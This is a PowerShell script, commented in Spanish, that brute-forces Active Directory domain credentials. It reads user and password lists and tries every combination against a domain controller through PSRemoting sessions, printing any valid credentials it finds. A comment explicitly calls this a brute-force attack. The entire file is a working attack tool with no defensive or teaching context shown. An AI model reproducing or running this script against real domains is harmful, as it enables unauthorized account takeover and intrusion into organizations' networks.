param (
    [string]$usuariosFilePath,
    [string]$contraseñasFilePath,
    [string]$dominio,
    [string]$servidor # IP del controlador de dominio
)

# Verificar que los archivos existen
if (-Not (Test-Path -Path $usuariosFilePath)) {
    Write-Host "El archivo de usuarios no existe: $usuariosFilePath"
    exit
}

if (-Not (Test-Path -Path $contraseñasFilePath)) {
    Write-Host "El archivo de contraseñas no existe: $contraseñasFilePath"
    exit
}

# Leer listas de usuarios y contraseñas
$usuarios = Get-Content -Path $usuariosFilePath
$contraseñas = Get-Content -Path $contraseñasFilePath

# Verificar la conectividad con el servidor
if (Test-Connection -ComputerName $servidor -Count 1 -Quiet) {
    Write-Host "Conectado al servidor: $servidor"
} else {
    Write-Host "No se puede conectar al servidor: $servidor"
    exit
}

# Función para probar la autenticación
function Test-DomainCredentials {
    param (
        [string]$username,
        [string]$password,
        [string]$domain,
        [string]$server
    )

    $fullUsername = "$domain\$username"
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential ($fullUsername, $securePassword)
    
    try {
        # Intenta autenticarse con las credenciales proporcionadas usando PSRemoting
        $session = New-PSSession -ComputerName $server -Credential $credentials -Authentication Negotiate -ErrorAction Stop
        Write-Host "¡Autenticación exitosa! Usuario: $fullUsername, Contraseña: $password"
        Remove-PSSession -Session $session
        return $true
    } catch {
        # Ignorar errores de autenticación
    }
    return $false
}

# Realizar ataque de fuerza bruta
foreach ($usuario in $usuarios) {
    foreach ($contraseña in $contraseñas) {
        Write-Host "Probando Usuario: $usuario con Contraseña: $contraseña"
        if (Test-DomainCredentials -username $usuario -password $contraseña -domain $dominio -server $servidor) {
            Write-Host "Credenciales válidas encontradas: Usuario: $usuario, Contraseña: $contraseña"
            break
        }
    }
}
